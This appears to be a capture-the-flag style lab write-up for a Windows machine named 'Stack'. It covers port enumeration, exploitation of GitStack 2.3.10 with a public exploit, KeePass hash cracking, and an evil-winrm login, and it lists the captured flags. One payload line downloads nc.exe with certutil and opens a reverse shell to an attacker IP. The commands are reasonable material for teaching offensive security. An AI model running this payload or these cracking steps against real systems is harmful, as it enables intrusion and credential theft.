# Stack

**IP Address:** 172.31.1.12

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 3389/tcp | open | ms-wbt-server |   |
| 445/tcp | open | microsoft-ds | Microsoft Windows Server 2008 R2 - 2012 microsoft-ds  |
| 47001/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 49152/tcp | open | msrpc | Microsoft Windows RPC  |
| 49153/tcp | open | msrpc | Microsoft Windows RPC  |
| 49154/tcp | open | msrpc | Microsoft Windows RPC  |
| 49155/tcp | open | msrpc | Microsoft Windows RPC  |
| 49156/tcp | open | msrpc | Microsoft Windows RPC  |
| 49163/tcp | open | msrpc | Microsoft Windows RPC  |
| 49164/tcp | open | msrpc | Microsoft Windows RPC  |
| 5985/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 80/tcp | open | http | Apache httpd 2.2.22 |
| 137/udp | open | netbios-ns | Microsoft Windows netbios-ns  |
| 138/udp | open|filtered | netbios-dgm |   |
| 4500/udp | open|filtered | nat-t-ike |   |
| 500/udp | open|filtered | isakmp |   |

## Exploitation
### Exploit Details (SearchSploit)
* **Name** - GitStack 2.3.10 - Remote Code Execution 
* **CVE** - N/A
* **Module** - php/webapps/43777.py
* **Disclosed** - 2018-01-18
* **References**
  * https://www.exploit-db.com/exploits/43777

1. Modify the exploit so the payload is "certutil.exe -urlcache -f http://10.10.0.15/windows/privesc/nc.exe nc.exe && nc -e cmd.exe 10.10.0.15 53" and run. 

Commands
```
python 43777.py
whoami
cat /var/www/local.txt
```

![Execute Exploit](images/exploit1.png)

![Execute Exploit](images/exploit2.png)

## Privilege Escalation
### Exploit Details ()
* **Name** - 
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

The Documents folder of the user john contains a keepass database that can be cracked. The Keepass database contains the credentials for the administrator user. 

Commands
```
keepass2john password_manager.kdbx > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![Execute Exploit](images/privesc1.png)

![Execute Exploit](images/privesc2.png)

Commands
```bash
evil-winrm -i $ip -u administrator -p secur3_apass262
type C:\Users\Administrator\Desktop\system.txt
```

![Execute Exploit](images/privesc3.png)

## Loot
```
access.txt
reb656565983289247427842gtamf6
system.txt
e3ce12b1bb796932868b0d793c9fac3c
```